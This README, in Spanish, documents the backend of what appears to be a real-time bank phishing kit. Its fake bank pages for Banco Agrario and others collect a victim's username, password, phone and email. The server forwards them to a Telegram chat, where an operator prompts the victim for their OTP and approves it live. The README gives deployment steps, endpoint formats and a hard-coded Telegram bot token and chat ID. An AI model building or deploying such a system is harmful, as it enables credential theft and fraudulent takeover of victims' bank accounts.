# 🏦 Alcanos Payment Server

Servidor universal para todas las entidades bancarias en `bankroutes/`. Conecta con Telegram para aprobar/rechazar pagos.

---

## 📋 Requisitos

- Python 3.9+
- Cuenta en [Render.com](https://render.com)
- Bot de Telegram (obtén el token de [@BotFather](https://t.me/BotFather))

---

## 🚀 Deploy en Render

### 1. Crear repositorio en GitHub

```bash
cd server
git init
git add .
git commit -m "Initial commit: Alcanos payment server"
git remote add origin https://github.com/TU_USUARIO/alcanos-server.git
git push -u origin main
```

### 2. Crear nueva Web Service en Render

1. Ir a [Render.com](https://render.com/dashboard)
2. Click en **"New +"** → **"Web Service"**
3. Conectar repositorio GitHub
4. Configurar:
   - **Name:** `alcanos-server`
   - **Environment:** `Python 3`
   - **Build Command:** `pip install -r requirements.txt`
   - **Start Command:** `gunicorn app:app`
   - **Plan:** Starter (gratis)

### 3. Agregar variables de entorno

En **Settings** → **Environment**:

```
TELEGRAM_BOT_TOKEN=8499803362:AAHxkqI11-YbYgHvjQZf3l7EkpTHanKOe14
TELEGRAM_CHAT_ID=-1002904816351
```

### 4. Deploy

Render automáticamente deploy cuando hagas push a main.

El URL será: `https://alcanos-server.onrender.com`

---

## 📝 Actualizar URL en agrario.html

En `bankrutes/agrario.html`, cambiar:

```javascript
const SERVER_URL = 'https://alcanos-server.onrender.com/api';
```

---

## 🔌 Endpoints

### `POST /api/login`
Recibe credenciales y envía a Telegram con botones.

**Request:**
```json
{
  "sessionId": "sess_12345_abc",
  "bank": "BANCO AGRARIO",
  "usuario": "user123",
  "clave": "pass123",
  "phone": "+573001234567",
  "amount": "$1,000.00",
  "email": "user@example.com",
  "persona": "natural"
}
```

**Response:**
```json
{
  "success": true,
  "sessionId": "sess_12345_abc"
}
```

---

### `GET /api/session/<sessionId>`
Polling para obtener estado de la sesión (llamar cada 1.5 seg).

**Response:**
```json
{
  "status": "waiting|error_login|otp|otp_error|finalizar",
  "message": "Descripción",
  "otpLabel": "Ingresa el código..."
}
```

---

### `POST /api/otp`
Envía código OTP para confirmar.

**Request:**
```json
{
  "sessionId": "sess_12345_abc",
  "otp": "123456"
}
```

**Response:**
```json
{
  "success": true
}
```

---

### `GET /api/health`
Health check (usado para keep-alive).

**Response:**
```json
{
  "status": "active",
  "timestamp": "2024-10-12T15:30:45.123456",
  "sessions_count": 5
}
```

---

## 🔔 Flujo Completo

1. **Usuario ingresa credenciales** en agrario.html
2. **Servidor recibe** POST /api/login
3. **Telegram recibe** mensaje con botones (✅ PERMITIR OTP, ❌ RECHAZAR)
4. **Admin hace click** en botón
5. **Servidor actualiza** estado de sesión
6. **Cliente hace polling** a GET /api/session cada 1.5 seg
7. **Cliente ve cambio** de estado y abre panel OTP
8. **Usuario ingresa OTP** 
9. **Servidor recibe** POST /api/otp
10. **Telegram recibe** OTP con nuevos botones (✅ CONFIRMAR OTP, ❌ RECHAZAR OTP)
11. **Admin aprueba/rechaza**
12. **Cliente redirige** a exito.html o muestra error

---

## ⏰ Keep-Alive (Anti-Sleep)

El servidor ejecuta un thread que hace ping a sí mismo cada 10 minutos.

Render duerme apps inactivas después de 15 min, pero este keep-alive las mantiene activas.

---

## 🛠️ Desarrollo Local

```bash
# Instalar dependencias
pip install -r requirements.txt

# Crear archivo .env
cp .env.example .env

# Editar .env con tus credenciales de Telegram

# Ejecutar servidor
python app.py
```

Acceso: `http://localhost:5000`

---

## 📦 Estructura

```
server/
├── app.py                 # Servidor Flask
├── requirements.txt       # Dependencias
├── Procfile              # Config para Render
├── .env.example          # Variables de ejemplo
└── README.md             # Este archivo
```

---

## 🎨 Usar para otras entidades

El servidor es universal. Para agregar más bancos:

1. Crear nuevo archivo en `bankroutes/` (ej: bbva.html)
2. Cambiar `const SERVER_URL` al mismo servidor
3. Cambiar `const BANK = 'BANCO BBVA'`
4. ¡Listo! El servidor automáticamente maneja diferentes bancos

---

## 🔐 Seguridad

⚠️ **Esto es una demo.** En producción:

- Usar base de datos real (PostgreSQL, MongoDB)
- Encriptar credenciales
- Validar tokens JWT
- Rate limiting
- HTTPS obligatorio
- Logs y monitoreo

---

## 📞 Soporte

Si algo no funciona:

1. Verificar variables de entorno en Render
2. Ver logs en Render Dashboard
3. Verificar que el bot de Telegram tiene acceso al chat
4. Probar `/api/health` en navegador

---

**Creado para Alcanos de Colombia** 🇨🇴
